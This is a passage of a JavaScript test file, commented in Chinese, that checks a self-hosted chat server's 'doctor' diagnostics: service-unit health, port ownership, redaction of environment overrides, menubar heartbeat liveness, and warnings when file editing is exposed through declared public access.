    ownership: 'managed', state: 'running', flapping: false, drift: [], ...over,
  });

  test('非 macOS → ok 并说明跳过原因（CI 与 Docker 都在 Linux 上，不能红）', () => {
    const r = serviceUnitsDiagnostic({ platform: 'linux', supported: false, units: [] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /macOS/);
  });

  // 启动收敛成两条入口（headless npm start / macOS desktop）后，deployment.md 明说
  // 【本仓库不提供官方 systemd unit】。这句跳过说明此前写「Linux 请用 systemd，见
  // docs/deployment.md」，把用户支去找一份不存在的指南。同源的还有 scripts/service.js
  // 的降级警告——两处要一起对，只改一处就是留一半假指路。
  test('非 macOS 的跳过说明指向真实入口，中英两版都不指 systemd', () => {
    const zh = serviceUnitsDiagnostic({ platform: 'linux', supported: false, units: [] });
    const en = serviceUnitsDiagnostic({ platform: 'linux', supported: false, units: [], lang: 'en' });

    assert.match(zh.detail, /npm start/, 'headless 是全平台基线，指路要落在它上面');
    assert.doesNotMatch(zh.detail, /请用 systemd/);
    assert.match(en.detail, /npm start/);
    assert.doesNotMatch(en.detail, /use systemd/);
  });

  test('server 在跑且归属清晰 → ok', () => {
    const r = serviceUnitsDiagnostic({ platform: 'darwin', supported: true, units: [server()] });
    assert.equal(r.status, 'ok');
  });

  test('未安装 → warn 并给出安装命令（新用户最需要的一句）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'not-installed', ownership: 'adoptable' })],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /service:install|未安装/);
  });

  // 「未安装」对 headless 用户不是缺陷——终端里 npm start 本来就不装 LaunchAgent。
  // 原文案只说「关掉终端 server 就停了、开机也不会自启」，读起来像少装了必需件。
  test('未安装的提示要说清 headless 用不着它，别把正当入口说成缺件', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'not-installed', ownership: 'adoptable' })],
    });
    assert.match(r.detail, /npm start|headless/, '要点明另一条入口本来就不需要它');
  });

  // 机主的隧道就是这个状态。只看 PID 会一直显绿灯，而它其实在反复崩溃重启。
  test('flapping → warn 并点名是哪个 unit', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server(), { unit: 'tunnel', label: 'com.ccm.tunnel', known: true, ownership: 'foreign', state: 'running', flapping: true, drift: [] }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /com\.ccm\.tunnel/);
  });

  // ★ classifyState 的取值域是 4 个，早前只处理了 not-installed / crashed，
  // stopped 掉进末尾的 ok 分支，输出「运行中（共 0 个 unit 在跑）」—— 服务是停的却报绿，
  // 而且文案自相矛盾。这正是 D16 存在的理由所覆盖的场景之一。
  test('server stopped（plist 在盘上但没被加载）→ warn，且文案不能说「运行中」', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'stopped' })],
    });
    assert.equal(r.status, 'warn');
    assert.ok(!r.detail.includes('运行中'), `文案不能说运行中：${r.detail}`);
    assert.match(r.detail, /未运行|已停止|没在跑/);
  });

  test('server crashed → fail（装了却没在跑，是明确故障）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ state: 'crashed' })],
    });
    assert.equal(r.status, 'fail');
  });

  test('配置漂移 → warn 并列出漂移维度', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ drift: ['repo-path'] })],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /repo-path/);
  });

  test('shape 漂移的 foreign unit 不算问题（自定义启动方式是有意配置，别年年报黄）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server(), { unit: 'tunnel', label: 'com.ccm.tunnel', known: true, ownership: 'foreign', state: 'running', flapping: false, drift: ['shape'] }],
    });
    assert.equal(r.status, 'ok');
  });

  test('detail 里绝不出现 plist 绝对路径（脱敏纪律）', () => {
    const r = serviceUnitsDiagnostic({
      platform: 'darwin', supported: true,
      units: [server({ plistPath: '/Users/you/Library/LaunchAgents/com.ccm.server.plist', drift: ['repo-path'] })],
    });
    assert.ok(!r.detail.includes('/Users/you'), 'doctor 输出不回显绝对路径');
  });

  test('status --json 拿不到（service.js 挂了）→ warn 而非 fail，不阻断整份体检', () => {
    assert.equal(serviceUnitsDiagnostic({ platform: 'darwin', supported: true, units: null }).status, 'warn');
  });
});

// ── D4 修正：端口被自家常驻服务占用不是故障 ─────────────────────────────
// 旧实现无条件把「端口连得上」判成 fail，而常驻部署（文档主推的拓扑）下这是**恒红**的假警报。
test.describe('portOccupancyDiagnostic', () => {
  test('端口空闲 → ok', () => {
    assert.equal(portOccupancyDiagnostic({ port: 3000, occupied: false }).status, 'ok');
  });

  test('被自家 server unit 占用 → ok（这正是常驻部署的正常态）', () => {
    const r = portOccupancyDiagnostic({ port: 3000, occupied: true, ownerLabel: 'com.ccm.server' });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /com\.ccm\.server/);
  });

  test('被不明进程占用 → fail（真冲突，要提示怎么查）', () => {
    const r = portOccupancyDiagnostic({ port: 3000, occupied: true, ownerLabel: null });
    assert.equal(r.status, 'fail');
    assert.match(r.detail, /lsof|占用/);
  });

  test('端口号非法 → fail', () => {
    assert.equal(portOccupancyDiagnostic({ port: 0 }).status, 'fail');
    assert.equal(portOccupancyDiagnostic({ port: 70000 }).status, 'fail');
    assert.equal(portOccupancyDiagnostic({ port: NaN }).status, 'fail');
  });

  test('探测本身失败（非 ECONNREFUSED）→ warn，不武断判占用', () => {
    const r = portOccupancyDiagnostic({ port: 3000, probeError: 'EHOSTUNREACH' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /EHOSTUNREACH/);
  });
});

// 第三轮审查 #4：flapping 的语义在 6a38e7c 里从「上次退出码 ≠ 0」换成了「1 小时内 ≥3 次重启」，
// 但这条文案没跟上，于是它对着一个一次都没崩过的 unit 说「曾异常退出（被 KeepAlive 拉起）」——
// 那是**编造的事实**，会把排障往错误方向带。反过来真崩了一次被拉起的 unit，这里什么都不说。
test.describe('serviceUnitsDiagnostic —— flapping 文案必须说频率，不能说「曾异常退出」', () => {
  const base = { platform: 'darwin', supported: true };
  const unit = (over) => ({ unit: 'server', label: 'com.ccm.server', state: 'running', drift: [], ...over });

  test('flapping 的 detail 说的是重启频率', () => {
    const r = serviceUnitsDiagnostic({
      ...base,
      units: [unit({ flapping: true, restarts: { lastHour: 4, last24h: 9, flapping: true, lastRestartAt: 1 } })],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /1 小时内|频繁重启|重启 4 次/, `应说频率，实际：${r.detail}`);
    assert.doesNotMatch(r.detail, /曾异常退出|KeepAlive/, `不该再说退出码语义，实际：${r.detail}`);
  });

  test('单次异常退出（lastExitAbnormal）不再产出 flapping 告警，但也不该被完全隐藏', () => {
    const r = serviceUnitsDiagnostic({
      ...base,
      units: [unit({ flapping: false, lastExitAbnormal: true, restarts: { lastHour: 0, last24h: 1, flapping: false, lastRestartAt: 1 } })],
    });
    assert.equal(r.status, 'ok', '单次异常退出不是故障——恒亮告警比没有告警更糟');
  });
});

// 第三轮审查：D4 那条「端口被自家服务占用是正常态」的**三条件判据**此前完全没有测试
// （servicePortOwner / readServiceStatus 在 tests/ 里零引用），被测的 portOccupancyDiagnostic
// 只接收算好的 ownerLabel。把 servicePortOwner 改成无条件 `return server.label`，
// 全套单测照样绿 —— 而那意味着「别的进程占了我要用的端口」会被报成「预期占用」，
// 正是这条判据当初要避免的失败，方向相反。
test.describe('resolveServicePortOwner —— 三个条件缺一不可', () => {
  const status = (over) => ({ units: [{ unit: 'server', label: 'com.ccm.server', state: 'running', listen: { port: 3000, reachable: true }, ...over }] });

  test('三条件齐备 → 认作自家占用', () => {
    assert.equal(resolveServicePortOwner({ status: status(), port: 3000 }), 'com.ccm.server');
  });

  test('unit 没在跑 → null（端口是别人占的）', () => {
    assert.equal(resolveServicePortOwner({ status: status({ state: 'stopped' }), port: 3000 }), null);
  });

  test('端口对不上 → null（doctor --env=other.env 的 PORT 可能与常驻服务不同）', () => {
    assert.equal(resolveServicePortOwner({ status: status(), port: 4000 }), null);
  });

  test('连不上 → null（进程在但端口不是它开的）', () => {
    assert.equal(resolveServicePortOwner({ status: status({ listen: { port: 3000, reachable: false } }), port: 3000 }), null);
  });

  test('读不到 status / 没有 server unit → null，不抛错', () => {
    assert.equal(resolveServicePortOwner({ status: null, port: 3000 }), null);
    assert.equal(resolveServicePortOwner({ status: { units: [] }, port: 3000 }), null);
    assert.equal(resolveServicePortOwner({}), null);
  });
});

test.describe('envOverrideDiagnostic —— shell env 压过配置文件的可见性', () => {
  test('无覆盖 → ok', () => {
    const d = envOverrideDiagnostic({ shellEnv: { PATH: '/usr/bin', HOME: '/Users/x' }, keys: ['PORT', 'DEV_MODE'], lang: 'zh' });
    assert.equal(d.status, 'ok');
  });

  test('有覆盖 → warn，逐个列出键名，但绝不打印值（AUTH_TOKEN/VAPID 私钥可能就在其中）', () => {
    const d = envOverrideDiagnostic({
      shellEnv: { CF_ACCESS_TEAM: 'super-secret-team', DEV_MODE: '1', PATH: '/usr/bin' },
      keys: ['CF_ACCESS_TEAM', 'DEV_MODE', 'PORT'],
      lang: 'zh',
    });
    assert.equal(d.status, 'warn');
    assert.match(d.detail, /CF_ACCESS_TEAM/);
    assert.match(d.detail, /DEV_MODE/);
    assert.equal(d.detail.includes('super-secret-team'), false, '值可能是密钥，只许出现键名');
  });

  // 2026-08-19 真机证伪：机主照着旧提示跑了 exec zsh，doctor 输出一字未变——exec 只换进程映像，
  // 环境原样继承。提示必须给「真能清掉」的动作，且带上具体键名可直接粘贴。
  test('提示是可直接粘贴的 unset 命令，且绝不建议 exec', () => {
    for (const lang of ['zh', 'en']) {
      const d = envOverrideDiagnostic({
        shellEnv: { CCM_DATA_DIR: '/tmp/x', LOG_TERMINAL: 'on' },
        keys: ['CCM_DATA_DIR', 'LOG_TERMINAL'],
        lang,
      });
      assert.match(d.detail, /unset CCM_DATA_DIR LOG_TERMINAL/, `${lang}: 要给带具体键名、可粘贴的命令`);
      // 提到 exec 可以，但只能是「它没用」——绝不能把它作为解决办法给出去
      if (/exec/.test(d.detail)) {
        assert.match(d.detail, lang === 'zh' ? /exec[\s\S]{0,24}无效/ : /exec[\s\S]{0,40}fail/,
          `${lang}: 出现 exec 时必须明说它无效`);
      }
    }
  });

  test('空串按「未设置」口径不计（与 data-dir/normalizeLoadedEnvironment 同口径）', () => {
    const d = envOverrideDiagnostic({ shellEnv: { PORT: '' }, keys: ['PORT'], lang: 'zh' });
    assert.equal(d.status, 'ok');
  });

  // 配置面板要在**被压住的那一行**上打标记（VC-D4-02），而不是只给一段整体文案。
  // 命中的键名本来就已经算出来了，顺手出成结构化字段，省得调用方再解析 detail 那段散文
  // ——解析散文是下一次判据分叉的起点。
  test('命中的键名以结构化数组出（detail 那段散文不该被谁去反解析）', () => {
    const d = envOverrideDiagnostic({ shellEnv: { WORK_DIR: '/a', PORT: '' }, keys: ['WORK_DIR', 'PORT'], lang: 'zh' });
    assert.deepEqual(d.keys, ['WORK_DIR']);
  });

  test('无覆盖时 keys 是空数组而不是 undefined（调用方直接 .length 不用先判空）', () => {
    assert.deepEqual(envOverrideDiagnostic({ shellEnv: {}, keys: ['PORT'] }).keys, []);
  });
});

test.describe('identifySelfServer —— headless npm start 也要认得出是自家 server', () => {
  const REPO = '/Users/you/code/claude-chat-mobile';

  test('本仓的 node server.js（cwd 落在仓库根）→ 认领', () => {
    const r = identifySelfServer({
      processes: [{ pid: 39090, command: 'node server.js', cwd: REPO }],
      repoRoot: REPO,
    });
    assert.deepEqual(r, { pid: 39090, cwd: REPO });
  });

  test('★ 隔壁仓库的同名 server.js → 不认领（本机 codex-chat-mobile 就是真实反例）', () => {
    const r = identifySelfServer({
      processes: [{ pid: 50021, command: 'node server.js', cwd: '/Users/you/code/codex-chat-mobile' }],
      repoRoot: REPO,
    });
    assert.equal(r, null, '同名不等于同一个，cwd 对不上就不是自己');
  });

  test('无关进程 → 不认领', () => {
    assert.equal(identifySelfServer({
      processes: [{ pid: 1, command: 'nginx: master process', cwd: '/' }],
      repoRoot: REPO,
    }), null);
    assert.equal(identifySelfServer({ processes: [], repoRoot: REPO }), null);
  });
});

test('portOccupancyDiagnostic：端口被自家 headless server 占着是 ok，不再劝人「停掉它」', () => {
  const d = portOccupancyDiagnostic({ port: 3000, occupied: true, selfPid: 39090, lang: 'zh' });
  assert.equal(d.status, 'ok', 'headless npm start 是官方两条入口之一，不能恒红');
  assert.match(d.detail, /39090/);
  assert.equal(/停掉/.test(d.detail), false);
});

// ── menubarLivenessDiagnostic ──────────────────────────────────────────────
// 2026-08-23：机主的菜单栏 app 被一个沉到别人窗口后面的确认框冻死 **63 小时**，
// 期间系统里没有任何信号 —— menubar unit 因为 `open` + KeepAlive=false 恒显示「待机」，
// service.js health 只打 server 的 HTTP，doctor D16 只看 server。进程活着、图标还在，
// 但主线程回不到事件循环，点什么都没反应（连「退出」）。
//
// 心跳由 app 在**每轮探测完成时**写进 UserDefaults（见 ccm-menubar.swift 的 probe），
// 这里只负责判定。成功/失败都写，是为了把两件事分开：探测**失败**是 server 的问题
// （D16 管），探测**停摆**才是菜单栏自己卡住了。
test.describe('menubarLivenessDiagnostic', () => {
  const NOW = 1786000000000;          // 毫秒
  const AT = (agoSeconds) => (NOW / 1000) - agoSeconds;   // 秒（与 Swift 的 timeIntervalSince1970 同单位）

  test('进程没跑 → ok：没开菜单栏是完全正常的状态，不该报警', () => {
    const r = menubarLivenessDiagnostic({ running: false, nowMs: NOW });
    assert.equal(r.status, 'ok');
  });

  test('进程在但读不到心跳 → warn 而不是 fail：装的可能是不带心跳的旧版，升级即自愈', () => {
    const r = menubarLivenessDiagnostic({ running: true, lastProbeAt: null, nowMs: NOW });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /旧版|重新打开|app:install/);
  });

  test('心跳新鲜且上轮探测成功 → ok', () => {
    const r = menubarLivenessDiagnostic({ running: true, lastProbeAt: AT(10), lastProbeOk: true, nowMs: NOW });
    assert.equal(r.status, 'ok');
  });

  test('心跳新鲜但上轮探测失败 → warn：菜单栏活着，读不到状态是 server 的事（D16 管）', () => {
    const r = menubarLivenessDiagnostic({ running: true, lastProbeAt: AT(10), lastProbeOk: false, nowMs: NOW });
    assert.equal(r.status, 'warn');
    assert.doesNotMatch(r.detail, /卡住|冻/, '这一档不是菜单栏卡住，别把排障往错方向带');
  });

  test('心跳超时 → fail，且必须给出路（先查隐藏模态框，再 killall）', () => {
    const r = menubarLivenessDiagnostic({ running: true, lastProbeAt: AT(3600), lastProbeOk: true, nowMs: NOW });
    assert.equal(r.status, 'fail');
    assert.match(r.detail, /killall/, 'fail 不给出路等于只报警不解决——那次唯一的出路就是 killall');
    assert.match(r.detail, /osascript|对话框|模态/, '真实根因是看不见的模态框，应先查它再杀进程');
  });

  // ★ 单位换算必须由测试钉住：Swift 写的是**秒**，doctor 侧比的是**毫秒**。
  // 弄反的症状是「永远新鲜」或「永远五万年前」，两种都不会抛错，只会静默失效。
  test('lastProbeAt 按秒解读：刚好卡在阈值内外两侧', () => {
    const within = menubarLivenessDiagnostic({ running: true, lastProbeAt: AT(299), lastProbeOk: true, nowMs: NOW });
    const beyond = menubarLivenessDiagnostic({ running: true, lastProbeAt: AT(301), lastProbeOk: true, nowMs: NOW });
    assert.equal(within.status, 'ok', '299 秒前 < 5 分钟阈值，应判新鲜');
    assert.equal(beyond.status, 'fail', '301 秒前 > 5 分钟阈值，应判卡住');
  });

  // ── 构建新鲜度 ──────────────────────────────────────────────────────────
  // 2026-08-24 加：写 D19 时碰到的表达力上限 —— 它只能说「多半是旧版」，因为无从知道
  // 运行中的二进制是哪个 commit。bundle 里烘进 CCMBuildCommit 之后就能说准了。
  test('运行中的构建与 HEAD 一致 → 不额外唠叨', () => {
    const r = menubarLivenessDiagnostic({
      running: true, lastProbeAt: AT(10), lastProbeOk: true, nowMs: NOW,
      runningCommit: '1c4708a', headCommit: '1c4708a',
    });
    assert.equal(r.status, 'ok');
    assert.doesNotMatch(r.detail, /落后|不同/);
  });

  test('落后 N 个提交 → 报出 commit 与差距，并给换新版的具体做法', () => {
    const r = menubarLivenessDiagnostic({
      running: true, lastProbeAt: AT(10), lastProbeOk: true, nowMs: NOW,
      runningCommit: '39aea4f', headCommit: '1c4708a', commitsBehind: 3,
    });
    assert.match(r.detail, /39aea4f/);
    assert.match(r.detail, /3 个提交/);
    assert.match(r.detail, /app:install/, '只报差距不给做法等于让人自己去猜');
  });

  test('算不出差距（换过分支 / 该 commit 不是 HEAD 祖先）→ 只说不同，不编数字', () => {
    const r = menubarLivenessDiagnostic({
      running: true, lastProbeAt: AT(10), lastProbeOk: true, nowMs: NOW,
      runningCommit: '39aea4f', headCommit: '1c4708a', commitsBehind: null,
    });
    assert.match(r.detail, /不同/);
    assert.doesNotMatch(r.detail, /个提交/, '算不出来就别给一个看起来很确定的数字');
  });

  test('没有心跳时也把 commit 报出来 —— 这正是「多半是旧版」该被替换成的东西', () => {
    const r = menubarLivenessDiagnostic({
      running: true, lastProbeAt: null, nowMs: NOW,
      runningCommit: '39aea4f', headCommit: '1c4708a', commitsBehind: 2,
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /39aea4f/);
    assert.match(r.detail, /2 个提交/);
  });

  test('detail 里报出实际停摆时长，方便判断是刚卡还是卡了很久', () => {
    const r = menubarLivenessDiagnostic({ running: true, lastProbeAt: AT(63 * 3600), lastProbeOk: true, nowMs: NOW });
    assert.match(r.detail, /63/, '63 小时那次，时长本身就是最有信息量的一条');
  });
});

// ── D20: 文件编辑器直写 × 公网迹象 ─────────────────────────────────────────
// 背景（2026-08-30 需求合稿 R45 拍板）：FILE_EDIT 是唯一绕过 Agent 审批链的写入通道，
// 默认开维持不动（机主即 root，hard-rules §2.3）；doctor 只在「用户自己声明了公网入口」
// 时提示复核。判据只认两个显式声明：CF_ACCESS_* 三键齐设、PUBLIC_URL 非空——
// server 观测不到进程外的隧道（fail-open 教训），所以不猜「是否真的暴露」，只认声明。
test.describe('fileEditExposureDiagnostic（R45：直写通道 × 公网迹象提示）', () => {
  test('FILE_EDIT=off → ok，说明远程界面已只读', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: true, cfConfigured: true, publicUrl: 'https://ccm.example.com' });
    assert.equal(r.status, 'ok');
    assert.equal(r.name, 'FILE_EDIT');
    assert.match(r.detail, /off/);
  });

  test('默认开 + 无公网声明 → ok，且指出关闭开关（不 nag 局域网用户）', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: false, publicUrl: '' });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /FILE_EDIT=off/, '要给出关闭出路');
  });

  test('★ 默认开 + CF_ACCESS 齐设 → warn，点名审批链与信号来源', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: true, publicUrl: '' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /审批/, '要说清它绕过 Claude 审批链');
    assert.match(r.detail, /CF_ACCESS/, '要点名是哪个信号触发的');
    assert.match(r.detail, /FILE_EDIT=off/, '要给出行动出路');
  });

  test('★ 默认开 + 仅 PUBLIC_URL → warn，点名 PUBLIC_URL 但不回显 URL 值', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: false, publicUrl: 'https://secret-host.example.com' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /PUBLIC_URL/);
    assert.doesNotMatch(r.detail, /secret-host/, '与 envOverrideDiagnostic 同纪律：列键名不回显值');
  });

  test('英文文案同样四要素（状态/审批链/信号/出路）', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: true, publicUrl: '', lang: 'en' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /approval/i);
    assert.match(r.detail, /FILE_EDIT=off/);
  });

  // ── ACCESS_PROFILE 声明对信号集的影响 ──
  test('声明 reverse-proxy 本身就是公网信号 → warn 点名 ACCESS_PROFILE=reverse-proxy', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: false, publicUrl: '', accessProfile: 'reverse-proxy' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /ACCESS_PROFILE=reverse-proxy/);
  });
  test('声明 vpn 时 PUBLIC_URL 不再单独触发（文档教 VPN 用户设隧道内深链地址）→ ok', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: false, publicUrl: 'http://100.64.0.5:3000', accessProfile: 'vpn' });
    assert.equal(r.status, 'ok');
  });
  test('声明 vpn 压不掉 CF 信号（那是实际开启的公网层，不是声明）→ 仍 warn', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: true, publicUrl: '', accessProfile: 'vpn' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /CF_ACCESS/);
  });
  test('声明 lan 不抑制 PUBLIC_URL 信号（矛盾场景双保险方向安全）→ 仍 warn', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: false, publicUrl: 'https://x.example.com', accessProfile: 'lan' });
    assert.equal(r.status, 'warn');
  });
});

// ── D21: 公网访问方案自洽性 ────────────────────────────────────────────────
// 声明（ACCESS_PROFILE）与实际键（CF_ACCESS_* / PUBLIC_URL / AUTH_TOKEN / 通知配置）
// 的稳态核对。写入侧的 checkAccessProfileConsistency 只管「这一笔改动」，稳态失配归这里。
// 未知值按未声明处理且必须说出来（手改配置绕过校验的场景，fail-closed：未知值不得抑制告警）。
test.describe('accessProfileDiagnostic（D21：按声明方案做针对性检查）', () => {
  const clean = { profile: '', cfConfigured: false, publicUrl: '', authTokenSet: true, notifyConfigured: false };

  test('未声明 → ok 信息行：按 CF_ACCESS_* 推断 + 指出可声明获得针对性检查', () => {
    const r1 = accessProfileDiagnostic({ ...clean });
    assert.equal(r1.status, 'ok');
    assert.equal(r1.name, 'ACCESS_PROFILE');
    assert.match(r1.detail, /推断/);
    assert.match(r1.detail, /ACCESS_PROFILE/);
    const r2 = accessProfileDiagnostic({ ...clean, cfConfigured: true });
    assert.equal(r2.status, 'ok');
    assert.match(r2.detail, /[Cc]loudflare/);
  });

  test('未知值（手改配置绕过校验）→ warn「按未声明处理」', () => {
    const r = accessProfileDiagnostic({ ...clean, profile: 'tailscale' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /未声明处理/);
    assert.match(r.detail, /tailscale/);
  });

  test('cloudflare：三键不齐 → warn；齐 → ok 提 2FA 生效', () => {
    assert.equal(accessProfileDiagnostic({ ...clean, profile: 'cloudflare' }).status, 'warn');
    const ok = accessProfileDiagnostic({ ...clean, profile: 'cloudflare', cfConfigured: true });
    assert.equal(ok.status, 'ok');
    assert.match(ok.detail, /2FA/);
  });

  test('vpn：三键反而齐 → warn；token 未设 → warn 提隧道另一端连不上；通知已配但 PUBLIC_URL 空 → warn 提深链', () => {
    assert.match(accessProfileDiagnostic({ ...clean, profile: 'vpn', cfConfigured: true }).detail, /CF_ACCESS/);
    const noTok = accessProfileDiagnostic({ ...clean, profile: 'vpn', authTokenSet: false });
    assert.equal(noTok.status, 'warn');
    assert.match(noTok.detail, /AUTH_TOKEN/);
    const noUrl = accessProfileDiagnostic({ ...clean, profile: 'vpn', notifyConfigured: true });
    assert.equal(noUrl.status, 'warn');
    assert.match(noUrl.detail, /PUBLIC_URL/);
  });

  // §1.9「鉴权是启动前提」之后没 token 的 server 是**拒绝启动**，不是降级绑 loopback。
  // 同一份 doctor 里 bindDiagnostic 早就改对了（refuse.code=token_required → status fail），
  // 这里没跟上——两条检查对同一个状态给出两种说法，而「只绑 127.0.0.1」还会让人以为
  // 至少本机浏览器能用（实际连进程都起不来）。没有门禁把这两处绑在一起，只能靠测试钉住。
  test('token 未设的说法必须与 bindDiagnostic 一致：拒绝启动，不是绑 loopback', () => {
    for (const profile of ['vpn', 'reverse-proxy', 'lan']) {
      const r = accessProfileDiagnostic({ ...clean, profile, authTokenSet: false });
      assert.equal(r.status, 'warn', profile);
      assert.match(r.detail, /拒绝启动|不启动/, `${profile}：要说清是起不来`);
      assert.doesNotMatch(r.detail, /只绑\s*127\.0\.0\.1/, `${profile}：§1.9 之后不再有「降级绑 loopback」这回事`);
    }
  });

  test('vpn 全净 → ok + 提示 PWA/Push 需 HTTPS', () => {
    const r = accessProfileDiagnostic({ ...clean, profile: 'vpn', publicUrl: 'http://100.64.0.5:3000', notifyConfigured: true });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /HTTPS/);
  });

  test('reverse-proxy 全净 → ok + 提反代层认证与 deployment.md 硬要求', () => {
    const r = accessProfileDiagnostic({ ...clean, profile: 'reverse-proxy', publicUrl: 'https://x.example.com' });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /认证/);
    assert.match(r.detail, /deployment/);
  });

  test('lan：三键齐 / PUBLIC_URL 设了 / token 未设 → 各自 warn；全净 → ok', () => {
    assert.equal(accessProfileDiagnostic({ ...clean, profile: 'lan', cfConfigured: true }).status, 'warn');
    assert.equal(accessProfileDiagnostic({ ...clean, profile: 'lan', publicUrl: 'https://x.example.com' }).status, 'warn');
    assert.equal(accessProfileDiagnostic({ ...clean, profile: 'lan', authTokenSet: false }).status, 'warn');
    assert.equal(accessProfileDiagnostic({ ...clean, profile: 'lan' }).status, 'ok');
  });

  test('多问题聚合进一条 detail（vpn + 三键齐 + token 未设 → 一条 warn 两个问题）', () => {
    const r = accessProfileDiagnostic({ ...clean, profile: 'vpn', cfConfigured: true, authTokenSet: false });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /CF_ACCESS/);
    assert.match(r.detail, /AUTH_TOKEN|127\.0\.0\.1/);
  });

  test('★ 脱敏：detail 与整个返回值都不回显传入的 PUBLIC_URL 值', () => {
    const r = accessProfileDiagnostic({ ...clean, profile: 'lan', publicUrl: 'https://secret-host.example.com' });
    assert.doesNotMatch(JSON.stringify(r), /secret-host/);
  });

  // ── direct：公网 IP + 端口转发，没有任何中间节点 ────────────────────────────
  //
  // 它值得单列枚举值，是因为有两条判据与其余四档都不同、且方向相反：
  //   1. 暴露面最大（端口直接挂在公网上，扫描器会持续敲），却
  //   2. 限速分桶最准（peer 就是真实客户端 IP，不像反代那样全塌成 127.0.0.1 一个桶）。
  // 而 reverse-proxy 分支给的「在入口层再补一层认证」对它是**不可执行的建议**——没有入口层。
  test('direct 全净 → ok，且说清 AUTH_TOKEN 是唯一的门，不给「入口层补认证」这种做不到的建议', () => {
    const r = accessProfileDiagnostic({ ...clean, profile: 'direct', publiclyReachable: true });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /AUTH_TOKEN/, '要点名唯一那道门是什么');
    assert.doesNotMatch(r.detail, /入口层|反代层/, 'direct 没有入口层可补认证，给了也做不到');
  });

  test('direct 进公网信号集：FILE_EDIT 直写要被点名（暴露面最大的一档漏了就是 fail-open）', () => {
    const r = fileEditExposureDiagnostic({ fileEditOff: false, cfConfigured: false, publicUrl: '', accessProfile: 'direct' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /ACCESS_PROFILE=direct/);
  });

  // 声明「公网直连」却只绑 127.0.0.1 = 端口转发没有转发目标，谁也连不上。
  // 这个矛盾 bindDiagnostic 抓不到：它对 loopback 说的是「手机无法直连是预期行为」——
  // 对 reverse-proxy 确实是预期（反代连的就是 loopback），对 direct 恰好说反。
  test('direct / lan + 只绑 loopback → warn（声明与监听面自相矛盾）', () => {
    for (const profile of ['direct', 'lan']) {
      const r = accessProfileDiagnostic({ ...clean, profile, publiclyReachable: false });
      assert.equal(r.status, 'warn', profile);
      assert.match(r.detail, /BIND_MODE|127\.0\.0\.1|本机/, `${profile}：要指向监听面`);
    }
  });

  test('vpn / reverse-proxy / cloudflare + 只绑 loopback → 不因此 warn（那是它们的推荐形态）', () => {
    // vpn：deployment.md 的 BIND_MODE 表明确把 loopback 列为「自己用 SSH/Tailscale Serve/反代转发」
    //      的适用档——照文档做还被追着 warn 是自相矛盾（与 fileEditExposureDiagnostic 对 vpn 的
    //      PUBLIC_URL 抑制同一条纪律）。cloudflare / reverse-proxy：入口进程连的就是 loopback。
    for (const profile of ['vpn', 'reverse-proxy']) {
      const r = accessProfileDiagnostic({ ...clean, profile, publiclyReachable: false, publicUrl: 'https://x.example.com' });
      assert.equal(r.status, 'ok', `${profile} 不该因 loopback 报警：${r.detail}`);
    }
    const cf = accessProfileDiagnostic({ ...clean, profile: 'cloudflare', cfConfigured: true, publiclyReachable: false });
    assert.equal(cf.status, 'ok');
  });

  test('publiclyReachable 未传 → 不做任何断言（调用方没给就别猜，也别静默算成矛盾）', () => {
    assert.equal(accessProfileDiagnostic({ ...clean, profile: 'direct' }).status, 'ok');
    assert.equal(accessProfileDiagnostic({ ...clean, profile: 'lan' }).status, 'ok');
  });

  test('英文分支措辞完整（拿 vpn 缺 token 一例）', () => {
    const r = accessProfileDiagnostic({ ...clean, profile: 'vpn', authTokenSet: false, lang: 'en' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /refuses to start/);
    assert.match(r.detail, /AUTH_TOKEN/i);
    assert.doesNotMatch(r.detail, /[一-鿿]/, '英文分支不得混中文');
  });
});
